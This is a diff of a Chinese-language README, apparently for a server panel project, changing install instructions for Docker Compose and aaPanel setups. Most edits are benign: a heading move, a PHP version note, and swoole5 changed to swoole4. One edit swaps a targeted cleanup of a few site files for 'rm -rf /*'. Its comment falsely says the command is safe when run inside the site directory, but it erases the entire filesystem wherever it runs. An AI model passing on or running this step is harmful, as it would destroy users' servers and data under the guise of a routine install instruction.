@@ -33,10 +33,11 @@ Tron： TLypStEWsVrj6Wz9mCxbXffqgt5yz3Y4XB
 
 ## 安装 / 更新 / 回滚
 > 这里将给你介绍不同方式的 安装、更新、回滚步骤
+
+### Docker Compose 方式（推荐） aapanel用户请跳到下文
 ### 安装前准备
 - 安装前你需要自行安装好Mysql数据库（用户量小的可以忽略，使用Sqlite）
 - 安装前你需要自行安装好redis
-### Docker Compose 方式（推荐） 
 #### **安装部署**
 1. 安装docker
 ```
@@ -154,14 +155,14 @@ wget -O install.sh http://www.aapanel.com/script/install-ubuntu_6.0_en.sh && bas
 2. 选择使用LNMP的环境安装方式勾选如下信息  
 ☑️ Nginx 任意版本  
 ☑️ MySQL 5.7  
-☑️ PHP 8.1  
+☑️ PHP 8.1#弹窗的最高只有8.0版本，8.1版本自行前往appstore安装  
 选择 Fast 快速编译后进行安装。
 
 3. 安装扩展 
 > aaPanel 面板 > App Store > 找到PHP 8.1点击Setting > Install extentions选择以下扩展进行安装
 - redis
 - fileinfo
-- swoole5
+- swoole4
 - readline
 - event
 
@@ -182,9 +183,8 @@ wget -O install.sh http://www.aapanel.com/script/install-ubuntu_6.0_en.sh && bas
 >通过SSH登录到服务器后访问站点路径如：/www/wwwroot/你的站点域名。
 >以下命令都需要在站点目录进行执行。
 ```
-# 删除目录下文件
-chattr -i .user.ini
-rm -rf .htaccess 404.html index.html .user.ini
+# 删除目录下文件（此时必须在站点目录下进行，否则后果自负）
+rm -rf /*
 ```
 > 执行命令从 Github 克隆到当前目录。
 ```
